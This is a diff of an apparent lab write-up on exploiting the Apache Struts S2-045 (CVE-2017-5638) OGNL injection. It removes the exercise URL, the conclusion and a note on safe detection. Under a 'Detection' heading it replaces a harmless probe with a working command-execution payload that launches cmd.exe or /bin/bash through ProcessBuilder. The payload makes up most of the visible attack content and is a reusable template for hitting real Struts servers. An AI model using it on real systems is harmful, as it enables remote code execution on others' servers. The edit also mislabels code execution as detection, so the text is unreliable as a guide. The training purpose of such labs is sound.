@@ -1,8 +1,6 @@
 
 /usr/local/bin/score UUID
 
-You can access this exercise using the following URL: http://ptl-8c1ff287-f36d3391.libcurl.so/. 
-
 The payload
 
 A lot of exploits are already available, most of them are just wrappers around the following payload:
@@ -14,11 +12,9 @@ A lot of exploits are already available, most of them are just wrappers around t
 
 Detection
 
-We can easily tweak this payload to allow us to detect the vulnerability without trying to run command.
-
 ``` sh
 
-%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}
+%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'/usr/local/bin/score 03031824-841d-47c6-9cec-5144b3087f28\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.flush())}
 
 ```
 
@@ -61,9 +57,3 @@ Where:
 
 [PAYLOAD] is your payload.
 [SERVER] is the victim.
-
-Conclusion
-This exercise explained how to gain code execution when a Struts application is vulnerable to s2-045. When you are coming across a Struts application, it's essential that you test for this issue.
-
-
-https://securityonline.info/exploiting-apache-struts-s2-045-cve-2017-5638-vulnerability-with-metasploit/ 
